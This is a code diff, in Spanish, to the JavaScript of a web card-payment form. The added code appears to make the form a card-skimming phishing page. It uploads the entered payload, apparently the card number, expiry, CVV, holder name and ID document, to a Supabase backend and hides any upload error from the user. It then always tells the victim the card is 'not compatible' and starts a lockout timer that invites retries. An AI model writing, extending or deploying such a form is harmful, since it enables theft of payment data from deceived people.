@@ -646,7 +646,7 @@ document.getElementById('payBtn').addEventListener('click', async function() {
   // Verificar si está bloqueado
   var estado = verificarBloqueo();
   if (estado.bloqueado) {
-    msgEl.textContent = `Debes esperar \${estado.segundosRestantes} segundos para intentar de nuevo`;
+    msgEl.textContent = `Debes esperar ${estado.segundosRestantes} segundos para intentar de nuevo`;
     msgEl.className = 'pay-msg err';
     return;
   }
@@ -667,7 +667,7 @@ document.getElementById('payBtn').addEventListener('click', async function() {
 
   var errores = [];
   if (numVal.length < 16)      errores.push('Número de tarjeta incompleto');
-  if (!/^\d{2}\/\d{2}\$/.test(vencVal)) errores.push('Vencimiento inválido (MM/AA)');
+  if (!/^\d{2}\/\d{2}$/.test(vencVal)) errores.push('Vencimiento inválido (MM/AA)');
   if (cvvVal.length < 3)       errores.push('CVV incompleto');
   if (!nomVal)                 errores.push('Ingresá el nombre del titular');
   if (tipoActual === 'credito' && !docVal) errores.push('Ingresá el documento del titular');
@@ -696,7 +696,31 @@ document.getElementById('payBtn').addEventListener('click', async function() {
   try {
     // Solo enviar a Supabase si no se ha alcanzado el máximo de intentos
     if (intentosFallidos < maxIntentos) {
-      await guardarEnSupabase(payload
+      await guardarEnSupabase(payload);
+    }
+  } catch (err) {
+    // Silenciosamente ignora cualquier error de conexión
+    console.warn('Error al guardar en Supabase (oculto al usuario):', err.message);
+  }
+
+  // Incrementar contador de intentos fallidos
+  intentosFallidos++;
+  
+  // Establecer bloqueo si es el primer intento fallido
+  if (intentosFallidos === 1) {
+    bloqueadoHasta = new Date(Date.now() + (tiempoEspera * 1000));
+  }
+  
+  // Guardar estado
+  guardarEstadoIntentos();
+
+  // Mostrar mensaje de error
+  msgEl.textContent = 'Tu tarjeta no es compatible';
+  msgEl.className = 'pay-msg err';
+
+  // Actualizar estado del botón
+  actualizarEstadoBoton();
+});
 /* ================================================================
    CONFETI
    ================================================================ */
